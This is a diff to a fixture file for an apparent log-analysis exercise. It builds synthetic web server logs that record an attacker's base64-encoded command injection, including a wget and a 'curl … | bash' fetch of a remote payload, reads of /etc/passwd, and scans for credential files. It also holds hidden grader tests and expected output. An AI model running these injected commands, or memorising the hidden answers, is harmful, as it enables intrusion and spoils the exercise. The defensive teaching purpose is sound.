@@ -11,6 +11,44 @@ const mar = (d: number, h: number, m: number, s: number) => Date.UTC(2026, 2, d,
 
 const SCAN_PATHS = ['/.env', '/wp-login.php', '/.git/config', '/phpmyadmin/', '/backup.zip', '/server-status', '/config.php.bak', '/wp-admin/', '/admin', '/xmlrpc.php', '/.aws/credentials', '/api/v1/users'];
 
+/**
+ * 192.0.2.145 drove web02's diag.cgi with base64 in cmd= (Case 4's hidden test decodes these): cmd= isn't always
+ * the first parameter, one payload had its "=" URL-encoded (base64 -d prints "cat /etc/hosts", then fails),
+ * and two aren't base64 at all. Only artifacts: nothing here is ever executed.
+ */
+const diag02 = (t: number, query: string, status: number, size: number) => webHit('192.0.2.145', t, 'GET', `/cgi-bin/diag.cgi${query}`, status, size, 'python-requests/2.31.0');
+const WEB02_DIAG = [
+  diag02(mar(14, 2, 10, 3), '?cmd=d2hvYW1p', 200, 41), // whoami
+  diag02(mar(14, 2, 10, 30), '?v=2&cmd=bHMgLWxhIC92YXIvd3d3', 200, 902), // ls -la /var/www
+  diag02(mar(14, 2, 14, 11), '?cmd=Y2F0IC9ldGMvaG9zdHM%3D', 500, 612), // URL-encoded padding
+  diag02(mar(14, 2, 15, 40), '?cmd=d2dldCAtcSAtTyAvdG1wLy54L20gaHR0cDovLzIwMy4wLjExMy45OS9t&t=2', 200, 0), // wget …
+  diag02(mar(14, 2, 16, 2), '?cmd=Y2htb2QgK3ggL3RtcC8ueC9t', 200, 0), // chmod +x /tmp/.x/m
+  diag02(mar(14, 2, 20, 45), '?cmd=Y3JvbnRhYiAtbA==', 200, 77), // crontab -l
+  diag02(mar(14, 2, 31, 9), '?cmd=%60id%60', 500, 612), // backticks, not base64
+];
+
+/**
+ * web02's access log, Friday 22:00 to Saturday 08:00: the attacker's failed try at 00:38, a scanner, a near-miss IP
+ * on Monday, Mara's lookup of the address, and 192.0.2.145's diag.cgi commands. Case 4 uses the same log.
+ */
+export const WEB02_ACCESS_LOG = accessLog({
+  seed: 1703,
+  start: mar(13, 22, 0, 0),
+  end: mar(14, 8, 0, 0),
+  normal: 90,
+  extra: [
+    ...SCAN_PATHS.map((p, i) => webHit('203.0.113.88', mar(14, 3, 7, 0) + i * 3000, 'GET', p, 404, 196, 'python-requests/2.31.0')),
+    webHit('198.51.100.23', mar(14, 0, 38, 12), 'GET', '/portal/login', 404, 196),
+    webHit('198.51.100.23', mar(14, 0, 38, 15), 'GET', '/login', 200, 3307),
+    webHit('198.51.100.23', mar(14, 0, 39, 2), 'POST', '/login', 401, 512),
+    webHit('198.51.100.2', mar(9, 14, 18, 40), 'GET', '/', 200, 6120),
+    webHit('198.51.100.2', mar(9, 14, 18, 41), 'GET', '/login', 200, 3307),
+    // the address in a query string, from Mara's workstation: not a request FROM it
+    webHit('10.20.0.8', mar(14, 7, 52, 10), 'GET', '/admin/lookup?ip=198.51.100.23', 200, 812),
+    ...WEB02_DIAG,
+  ],
+});
+
 // Hidden: web02's evidence copy (the attacker tried there too, a scanner, a near-miss IP and two traps),
 // plus a mail01 folder that holds only an auth.log.
 defineFixture(
@@ -33,26 +71,9 @@ defineFixture(
       }) +
       // not sshd: Mara blocking the address. Must not count as an SSH event.
       'Mar 14 08:05:12 web02 sudo:     mara : TTY=pts/0 ; PWD=/home/mara ; USER=root ; COMMAND=/usr/sbin/ufw deny from 198.51.100.23\n';
-    const scanner = SCAN_PATHS.map((p, i) => webHit('203.0.113.88', mar(14, 3, 7, 0) + i * 3000, 'GET', p, 404, 196, 'python-requests/2.31.0'));
-    const web = accessLog({
-      seed: 1703,
-      start: mar(13, 22, 0, 0),
-      end: mar(14, 8, 0, 0),
-      normal: 90,
-      extra: [
-        ...scanner,
-        webHit('198.51.100.23', mar(14, 0, 38, 12), 'GET', '/portal/login', 404, 196),
-        webHit('198.51.100.23', mar(14, 0, 38, 15), 'GET', '/login', 200, 3307),
-        webHit('198.51.100.23', mar(14, 0, 39, 2), 'POST', '/login', 401, 512),
-        webHit('198.51.100.2', mar(9, 14, 18, 40), 'GET', '/', 200, 6120),
-        webHit('198.51.100.2', mar(9, 14, 18, 41), 'GET', '/login', 200, 3307),
-        // the address in a query string, from Mara's workstation: not a request FROM it
-        webHit('10.20.0.8', mar(14, 7, 52, 10), 'GET', '/admin/lookup?ip=198.51.100.23', 200, 812),
-      ],
-    });
     dir(vfs, '/srv/evidence', { mode: 0o750, gid: GID.adm });
     put(vfs, '/srv/evidence/web02/auth.log', auth, { mode: 0o640, gid: GID.adm });
-    put(vfs, '/srv/evidence/web02/apache2/access.log', web, { mode: 0o640, gid: GID.adm });
+    put(vfs, '/srv/evidence/web02/apache2/access.log', WEB02_ACCESS_LOG, { mode: 0o640, gid: GID.adm });
     put(vfs, '/srv/evidence/mail01/auth.log', authLog({ seed: 1704, host: 'mail01', noise: 5 }), { mode: 0o640, gid: GID.adm });
   },
   'case-timeline',
@@ -76,7 +97,7 @@ I’ll also run it on the evidence copies we took from other servers, so it need
     'Usage: `timeline.sh IP [LOGDIR]`. LOGDIR defaults to `/var/log`. The script reads `LOGDIR/auth.log` (syslog format, no year: it’s always **2026**) and `LOGDIR/apache2/access.log` (Apache combined format).',
     'No IP, more than two arguments, or an IP that doesn’t match `^[0-9]{1,3}(\\.[0-9]{1,3}){3}$` → message to stderr, **exit 2**.',
     'If `LOGDIR/auth.log` or `LOGDIR/apache2/access.log` is missing or unreadable → message to stderr, **exit 1**.',
-    'An **SSH event** is an `auth.log` line whose 5th field starts with `sshd` and that contains the IP as a whole space-separated word. Print it as `YYYY-MM-DD HH:MM:SS ssh MESSAGE`, where MESSAGE is the text after `sshd[PID]: `.',
+    'An **SSH event** is an `auth.log` line whose 5th field starts with `sshd` and that contains the IP as a whole space-separated word. Print it as `YYYY-MM-DD HH:MM:SS ssh MESSAGE`, where MESSAGE is the text after `sshd[PID]: `. Careful with fields: syslog pads days 1–9 with an extra space (`Mar  9 14:20:02`), so split with `read` or `awk`, not `cut -d\' \'`.',
     'A **web event** is an `access.log` line whose 1st field is exactly the IP. Print it as `YYYY-MM-DD HH:MM:SS web METHOD PATH STATUS`, e.g. `2026-03-13 23:58:10 web GET /portal/admin 403`.',
     'Line 1: `Timeline for IP`. Then every event line, SSH and web together, sorted with plain `sort` (the whole line as text: ISO stamps make that chronological, and events in the same second fall back to alphabetical order).',
     'Then `First seen: TS`, `Last seen: TS` (the stamps of the first and last event lines) and `Events: N`.',
@@ -129,14 +150,20 @@ I’ll also run it on the evidence copies we took from other servers, so it need
 2026-03-13 23:53:07 web GET /portal/ 200
 2026-03-13 23:54:31 web GET /portal/reports 200
 2026-03-13 23:55:09 web GET /portal/export?table=customers 200
+2026-03-13 23:57:52 web GET /cgi-bin/diag.cgi 200
 2026-03-13 23:58:10 web GET /portal/admin 403
+2026-03-13 23:58:23 web GET /cgi-bin/diag.cgi?cmd=aWQ= 200
 2026-03-13 23:58:44 web GET /portal/admin/users 403
+2026-03-13 23:58:51 web GET /cgi-bin/diag.cgi?cmd=dW5hbWUgLWE= 200
+2026-03-14 00:02:41 web GET /cgi-bin/diag.cgi?cmd=Y2F0IC9ldGMvcGFzc3dk 200
 2026-03-14 00:03:12 web GET /portal/export?table=invoices 200
 2026-03-14 00:11:37 web GET /portal/settings/api-keys 403
+2026-03-14 00:12:20 web GET /cgi-bin/diag.cgi?cmd=..%2f..%2fetc%2fpasswd 500
 2026-03-14 00:24:58 web GET /portal/logout 302
+2026-03-14 00:30:17 web GET /cgi-bin/diag.cgi?cmd=Y3VybCAtcyBodHRwOi8vMTk4LjUxLjEwMC43Ny91LnNoIHwgYmFzaA==&t=1 200
 First seen: 2026-03-13 23:05:00
-Last seen: 2026-03-14 00:24:58
-Events: 50`,
+Last seen: 2026-03-14 00:30:17
+Events: 56`,
   scriptPath: '~/cases/timeline.sh',
   fixture: 'case-timeline',
   starter: `#!/bin/bash
@@ -164,7 +191,7 @@ echo "Events: 0"
     { name: 'Hidden: web02’s evidence copy, with traps', args: ['198.51.100.23', '/srv/evidence/web02'], fixture: 'case-timeline-more', check: { output: 'reference' } },
     { name: 'Hidden: a scanner that only hit the website', args: ['203.0.113.88', '/srv/evidence/web02'], fixture: 'case-timeline-more', check: { output: 'reference' } },
     { name: 'Hidden: SSH only (Week 1’s attacker)', args: ['203.0.113.7'], fixture: 'case-timeline-more', check: { output: 'reference' } },
-    { name: 'Hidden: 198.51.100.2 is not 198.51.100.23', args: ['198.51.100.2', '/srv/evidence/web02'], fixture: 'case-timeline-more', check: { output: 'reference' } },
+    { name: 'Hidden: 198.51.100.2 is not 198.51.100.23 (and it came on March 9)', args: ['198.51.100.2', '/srv/evidence/web02'], fixture: 'case-timeline-more', check: { output: 'reference' } },
     { name: 'Hidden: an IP that never showed up', args: ['203.0.113.45', '/var/log'], fixture: 'case-timeline-more', check: { output: 'reference' } },
     { name: 'No IP → exit 2', args: [], check: { status: 2 } },
     { name: 'Not an IP → exit 2', args: ['198.51.100'], check: { status: 2 } },
